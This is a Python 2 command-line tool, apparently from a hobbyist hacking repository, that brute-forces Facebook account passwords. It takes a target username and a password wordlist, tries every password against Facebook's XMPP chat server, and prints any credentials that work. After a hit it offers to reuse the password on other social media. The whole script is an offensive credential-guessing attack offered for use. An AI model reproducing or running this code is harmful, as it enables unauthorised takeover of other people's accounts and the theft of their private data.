# coding=<utf-8>

import xmpp
import os
import getpass

#Colors
green = '\033[1;32m'
red = '\033[1;31m'
blue = '\033[1;34m'
endc = '\033[1;m'

def menu():
        os.system('clear')
        print '[+] - SOCIALMEDIABRUTEFORCE - [+]'
        print '[+] - GamblerRouterUser/PasswordCracker'
        print '[+] - DesenvolvedbyThe_Gambler'
        print
        print '[1] - Facebook Brute Force'
        print '[2] - Facebook Simple Login'
        print '[3] - Exit'
        print
        try:
                option = raw_input('[+] - Select a option[1-3]: ')
                if option == '1':
                        facebook_bf()
                elif option == '2':
                        facebook_sl()
                elif option == '3':
                        exit()
                else:
                        menu()
        except KeyboardInterrupt:
                menu()

#Username and password wordlist file
def credential(tag):
        #Brute Force credencials
        if tag == 'bf':
                username = raw_input('[+] - Insert username: ')
                passfile = raw_input('[+] - Insert password file: ')
                #Open wordlist file
                file = open(passfile)
                passwords = file.readlines()
                file.close()
                return username,passwords
        #Simple Login credencials
        elif tag == 'sl':
                username = raw_input('[+] - Insert username: ')
                password = getpass.getpass('[+] - Insert password: ')
                if password == '' or username == '':
                        print '[+] - Empty password is not allowed'
                        menu()
                else:
                        return username,password

def decision(proced):
        if proced == 'y':
                menu()
        elif proced == 'n':
                print '[+] - Exinting...'
                exit()

#Bruteforce Facebook
def facebook_bf():
        tag = 'bf'
        server = 'chat.facebook.com'
        port = 5222
        username,passwords = credential(tag)
        for password in passwords:
                #XMPP connect
                jid = xmpp.protocol.JID(username)
                cl = xmpp.Client(jid.getDomain(),debug=[])
                cl.connect((server,port))
                login = cl.auth(username,password)

                #Checking connection Result
                if login == None:
                        print
                        print red+'[+] - Connection was NOT Successful - [+]'
                        print '[+] - User: '+username
                        print '[+] - Password: '+password+endc
                else:
                        print
                        print green+'[+] - Connection was Successful - [+]'
                        print '[+] - User: '+username
                        print '[+] - Password: '+password+endc
                        print
                        proced = raw_input('[+] - Do you want to use the founded passowrd to perform a brute force in other Social Media?')
                        decision(proced)
                        #break

def facebook_sl():
        tag = 'sl'
        server = 'chat.facebook.com'
        port = 5222
        username,password = credential(tag)
        #XMPPconnect
        jid = xmpp.protocol.JID(username)
        cl = xmpp.Client(jid.getDomain(),debug=[])
        cl.connect((server,port))
        login = cl.auth(username,password)

        #Checking connection Result
        if login == None:
                print
                print red+'[+] - Connection was NOT Successful - [+]'
                print '[+] - User: '+username
                print '[+] - Password: '+password+endc
        else:
                print
                print green+'[+] - Connection was Successful - [+]'+endc
                print
                proced = raw_input('[+] - Do you want back to menu (y/n)? ').lower()
                decision(proced)

menu()
